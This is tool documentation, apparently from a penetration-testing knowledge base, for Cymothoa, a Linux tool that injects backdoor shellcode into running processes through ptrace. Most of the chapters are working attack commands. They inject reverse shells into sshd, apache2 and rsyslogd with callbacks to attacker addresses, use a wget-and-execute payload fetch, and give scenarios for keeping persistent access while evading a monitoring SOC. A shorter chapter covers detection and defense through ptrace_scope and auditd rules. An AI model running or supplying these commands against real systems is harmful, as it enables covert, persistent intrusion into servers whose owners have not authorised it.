---
title: "Cymothoa"
tool_name: "cymothoa"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Intermediate"
platform: "Linux"
language: "C"
license: "GPL-2.0"
repository: "https://cymothoa.sourceforge.net/"
kali_package: "cymothoa"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "process-injection"
  - "ptrace"
  - "linux"
  - "backdoor"
date_created: "2012-01-01"
last_updated: "2015-01-01"
author: "codwizard, crossbower (ES-Malaria)"
---

# Cymothoa — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

Cymothoa is a stealth backdooring tool for Linux systems. It injects shellcode into running processes using the ptrace library, turning a legitimate process into a backdoor without creating new files or processes.

### How It Works

Cymothoa uses the ptrace API — the same debugging interface used by GDB and strace — to manipulate target processes:

1. **Attach** to a running process via `ptrace(PTRACE_ATTACH)`
2. **Find** executable memory regions by parsing `/proc/<pid>/maps`
3. **Inject** shellcode into a code region (default: `/lib/ld`)
4. **Redirect** execution flow to the injected shellcode
5. **Maintain** persistence through alarm/signal-based scheduling

### Key Advantage

Because Cymothoa injects into existing processes, the backdoor:
- Leaves no new files on disk
- Inherits the target process's network connections and permissions
- Uses the target's existing memory space
- Avoids creating suspicious new processes

### Companion Tools

Cymothoa ships with two additional utilities:
- **bgrep**: Binary grep — search for hex patterns in binary files
- **udp_server**: A simple UDP server for testing Cymothoa payloads

---

## Chapter 2: Installation & Setup

### Kali Linux

```bash
sudo apt update && sudo apt install cymothoa
```

**Explanation:** Installs Cymothoa and its dependencies from the Kali repository.

### Verify Installation

```bash
cymothoa -h
```

Expected output:

```
Ver.1 (beta) - Runtime shellcode injection, for stealthy backdoors...

Usage:
    cymothoa -p <pid> -s <shellcode_number> [options]

Main options:
    -p  process pid
    -s  shellcode number
    -l  memory region name for shellcode injection (default /lib/ld)
    -m  memory region name for persistent memory (default /lib/ld)
    -S  list available shellcodes

Injection options:
    -f  fork parent process
    -F  don't fork parent process
    -b  create payload thread
    -B  don't create payload thread
    -w  pass persistent memory address
    -W  don't pass persistent memory address
    -a  use alarm scheduler
    -A  don't use alarm scheduler
    -t  use setitimer scheduler
    -T  don't use setitimer scheduler
```

### Required Privileges

Cymothoa requires root privileges to attach to other processes via ptrace:

```bash
sudo cymothoa -h
```

---

## Chapter 3: Basic Usage

### Listing Available Shellcodes

```bash
sudo cymothoa -S
```

**Explanation:** Lists all built-in shellcode payloads available in Cymothoa, including reverse shells, bind shells, and command execution shellcodes.

### Injecting a Reverse Shell

```bash
# Find the PID of a long-running process
pidof apache2

# Inject a reverse TCP shellcode into Apache
sudo cymothoa -p $(pidof apache2) -s 0 \
  -x 192.168.1.100 -y 4444
```

**Explanation:** Injects shellcode number 0 (typically a reverse TCP shell) into the Apache web server process, connecting back to 192.168.1.100 on port 4444.

### Injecting with Custom IP and Port

```bash
sudo cymothoa -p 1234 -s 1 \
  -x 10.0.0.50 -y 8080
```

**Explanation:** Injects shellcode into process 1234 with custom callback address and port parameters.

### Using Persistent Memory

Some shellcodes need persistent memory to store state between invocations:

```bash
sudo cymothoa -p $(pidof sshd) -s 0 \
  -x 192.168.1.100 -y 4444 \
  -m /lib/ld
```

**Explanation:** Specifies the memory region for persistent storage. Cymothoa searches for writable regions (`rw-p` permissions) in `/proc/<pid>/maps`.

### Complete Flags Reference

| Flag | Description |
|------|-------------|
| **-p** | Target process PID |
| **-s** | Shellcode number to use |
| **-l** | Memory region for shellcode injection (default: `/lib/ld`, search for `r-xp`) |
| **-m** | Memory region for persistent memory (default: `/lib/ld`, search for `rw-p`) |
| **-f** | Fork the parent process before injection |
| **-F** | Don't fork — inject directly into parent |
| **-b** | Create a separate thread for the payload |
| **-B** | Don't create a thread — run in main execution flow |
| **-w** | Pass persistent memory address to the shellcode |
| **-W** | Don't pass persistent memory address |
| **-a** | Use alarm-based scheduling for payload re-execution |
| **-A** | Don't use alarm scheduling |
| **-t** | Use setitimer-based scheduling |
| **-T** | Don't use setitimer scheduling |
| **-j** | Set timer value in seconds |
| **-k** | Set timer value in microseconds |
| **-x** | Set the callback IP address |
| **-y** | Set the callback port number |
| **-r** | Set secondary port number |
| **-z** | Set username (4 bytes) |
| **-o** | Set password (8 bytes) |
| **-c** | Set script code (e.g., `"#!/bin/sh\nls; exit 0"`) |

---

## Chapter 4: Intermediate Usage

### Choosing the Right Target Process

Select long-running processes that:
- Run with elevated privileges
- Have network access
- Are unlikely to be restarted frequently
- Won't trigger alerts if memory usage changes slightly

```bash
# Find suitable candidates
ps aux | grep -E "(sshd|apache2|nginx|cron|rsyslogd)" | grep -v grep

# Check memory map
cat /proc/$(pidof sshd)/maps | head -20
```

**Explanation:** The best injection targets are persistent, privileged daemons with legitimate network access — sshd, web servers, and cron are common choices.

### Fork vs No-Fork Injection

```bash
# Fork mode — original process continues normally
# Payload runs in a forked child process
sudo cymothoa -p $(pidof sshd) -s 0 \
  -x 192.168.1.100 -y 4444 -f

# No-fork mode — original process execution is replaced
# More stealthy but kills the original process
sudo cymothoa -p $(pidof sshd) -s 0 \
  -x 192.168.1.100 -y 4444 -F
```

**Explanation:** Fork mode preserves the target process at the cost of a new child process. No-fork mode is stealthier but the original process's functionality is lost.

### Alarm-Based Persistence

```bash
# Schedule payload re-execution every 30 seconds
sudo cymothoa -p $(pidof sshd) -s 0 \
  -x 192.168.1.100 -y 4444 \
  -a -j 30
```

**Explanation:** The alarm scheduler re-executes the shellcode at specified intervals, providing persistence even if the initial connection drops.

### Custom Script Execution

```bash
# Execute a custom script via the backdoor
sudo cymothoa -p $(pidof sshd) -s 2 \
  -c "#!/bin/sh\nwget http://192.168.1.100/payload.sh -O /tmp/.p && sh /tmp/.p"
```

**Explanation:** Shellcode number 2 executes arbitrary scripts, enabling custom post-exploitation activities.

---

## Chapter 5: Advanced Usage

### UDP Server for Testing

```bash
# Start the UDP listener for testing payloads
udp_server 4444
```

**Explanation:** Cymothoa includes a simple UDP server for testing shellcode that communicates over UDP.

### Binary Grep (bgrep)

```bash
# Search for a hex pattern in a binary
bgrep "\x90\x90\x90\x90" /usr/bin/sshd
```

**Explanation:** bgrep searches for hex byte patterns in binary files — useful for finding code caves or verifying shellcode placement.

### Combined with MSFvenom

```bash
# Generate shellcode with MSFvenom
msfvenom -p linux/x86/exec CMD="/bin/sh" -f raw -o /tmp/shell.bin

# Use Cymothoa's raw shellcode injection
# (Cymothoa primarily uses built-in shellcodes, but raw
# shellcode can be crafted for specific use cases)
```

**Explanation:** While Cymothoa primarily uses built-in shellcodes, understanding MSFvenom output formats helps when developing custom injection techniques.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Persistence After Privilege Escalation

After gaining root access to a Linux server, the objective was persistent access that survived user logouts:

```bash
# Inject into sshd — always running, network-capable
sudo cymothoa -p $(pidof sshd) -s 0 \
  -x 192.168.1.100 -y 4444 \
  -a -j 60

# Even if the initial connection drops, alarm-based
# scheduling re-establishes the shell every 60 seconds
```

**Explanation:** Injecting into sshd provides a persistent backdoor that inherits the SSH daemon's network access and runs with root privileges. The alarm scheduler ensures reconnection after network interruptions.

### Scenario 2: Stealth Backdoor on a Compromised Server

The SOC actively monitored for new processes, cron jobs, and SSH keys. Traditional persistence mechanisms were immediately detected:

```bash
# Inject into a rarely-monitored but always-running process
sudo cymothoa -p $(pidof rsyslogd) -s 0 \
  -x 10.0.0.50 -y 443 \
  -f -a -j 120

# rsyslogd is a natural choice — it runs on every server,
# rarely monitored for injection, and has no outbound
# network restrictions
```

**Explanation:** rsyslogd runs on virtually every Linux server with minimal security monitoring. Injecting here provides stealth persistence while the alarm scheduler maintains the connection.

### Scenario 3: CTF — Process Memory Manipulation

A CTF challenge required injecting shellcode into a running process to modify its behavior:

```bash
# Find the process
pidof target_binary

# Inject shellcode that modifies process behavior
sudo cymothoa -p $(pidof target_binary) -s 0 \
  -x 192.168.1.100 -y 4444

# The injection modifies the process's execution to
# also provide a reverse shell
```

**Explanation:** Cymothoa's ptrace-based injection demonstrates the fundamental process memory manipulation techniques used in CTF challenges.

---

## Chapter 7: Detection & Defense

### ptrace Detection

Since Cymothoa uses ptrace, defensive measures include:

- **Monitor ptrace attach calls** via auditd rules
- **Restrict ptrace** via `/proc/sys/kernel/yama/ptrace_scope`
- **Alert on unexpected ptrace usage** from non-debugger processes

```bash
# Restrict ptrace to parent processes only
echo 1 | sudo tee /proc/sys/kernel/yama/ptrace_scope
```

**Explanation:** Setting `ptrace_scope` to 1 restricts ptrace to parent processes, blocking Cymothoa from attaching to arbitrary processes.

### Process Memory Monitoring

- Scan for executable code in normally non-executable regions
- Monitor `/proc/<pid>/maps` for unexpected memory allocations
- Use **PE-sieve** or similar tools to detect injected code in running processes

### Audit Rules

```bash
# Monitor ptrace calls
auditctl -a always,exit -F arch=b64 -S ptrace -k ptrace_monitor

# Review with ausearch
ausearch -k ptrace_monitor
```

**Explanation:** Audit rules capture all ptrace system calls, providing forensic evidence of injection attempts.

### Defensive Recommendations

1. **Set `ptrace_scope=1`** on production servers
2. **Deploy auditd** with ptrace monitoring rules
3. **Monitor process memory** for unexpected executable regions
4. **Use mandatory access control** (SELinux/AppArmor) to restrict ptrace
5. **Regularly scan** `/proc/<pid>/maps` for anomalies

---

## Chapter 8: Troubleshooting

### "Permission denied" Error

**Cause:** Cymothoa requires root privileges to attach to processes.

```bash
sudo cymothoa -p <pid> -s 0
```

**Explanation:** ptrace attach requires `CAP_SYS_PTRACE` capability, which is typically only available to root.

### "Process not found" Error

**Cause:** The target process doesn't exist or the PID is incorrect.

```bash
pidof sshd
# Verify the PID is correct
ps -p $(pidof sshd) -o comm=
```

**Explanation:** Verify the target process exists and the PID is accurate before attempting injection.

### Target Process Crashes After Injection

**Cause:** The shellcode corrupted the target's execution flow, or the injection region was unsuitable.

```bash
# Try a different injection region
sudo cymothoa -p <pid> -s 0 \
  -l /usr/lib/libc.so.6 \
  -x 192.168.1.100 -y 4444
```

**Explanation:** Different memory regions have different characteristics. If the default `/lib/ld` region causes crashes, try alternative executable regions like libc.

### Shellcode Doesn't Persist

**Cause:** Alarm scheduling not enabled or the process restarted.

```bash
# Enable alarm-based persistence
sudo cymothoa -p <pid> -s 0 \
  -a -j 30 \
  -x 192.168.1.100 -y 4444
```

**Explanation:** Without alarm scheduling (`-a`), the shellcode executes once and doesn't reconnect. Enable it for persistent access.

---

## Resources

### Official Documentation

- [Cymothoa SourceForge](https://cymothoa.sourceforge.net/) — Project homepage
- [Kali Linux Cymothoa](https://www.kali.org/tools/cymothoa/) — Package documentation

### Related Tools

- [Metasploit Framework](https://www.metasploit.com/) — Alternative payload generation
- [ptrace Man Page](https://man7.org/linux/man-pages/man2/ptrace.2.html) — Understanding the ptrace API
- [PE-sieve](https://github.com/hasherezade/pe-sieve) — Process injection detection

### Research

- [Linux Process Injection Techniques](https://blog.nelhage.com/2011/03/exploiting-process-memory/) — ptrace fundamentals
- [ptrace(2) - Linux Manual Page](https://man7.org/linux/man-pages/man2/ptrace.2.html) — API reference

### Cymothoa vs Metasploit Process Injection

| Feature | Cymothoa | Metasploit |
|---------|----------|------------|
| Target OS | Linux only | Cross-platform |
| Injection method | ptrace | Multiple (mmap, mprotect, etc.) |
| Persistence | Alarm/setitimer scheduling | Session management |
| Shellcode options | Built-in library | Extensive MSFvenom output |
| Process selection | Manual PID | Automatic migration |
| Stealth level | High (ptrace-based) | Medium (new connections) |
| Persistence across reboot | No | No (requires separate persistence) |

### Memory Region Selection

Cymothoa allows custom memory regions for injection:

```bash
# View available regions for a process
cat /proc/$(pidof sshd)/maps

# Look for regions with these permissions:
# r-xp  → executable (for shellcode injection)
# rw-p  → writable (for persistent storage)

# Example output:
# 7f1234560000-7f1234580000 r-xp 00000000 08:01 12345 /lib/ld-2.31.so
# 7f1234780000-7f1234782000 rw-p 00020000 08:01 12345 /lib/ld-2.31.so
```

**Explanation:** The `r-xp` regions contain executable code where shellcode can be placed. The `rw-p` regions provide writable memory for persistent storage.

---

*Last updated: July 2026*
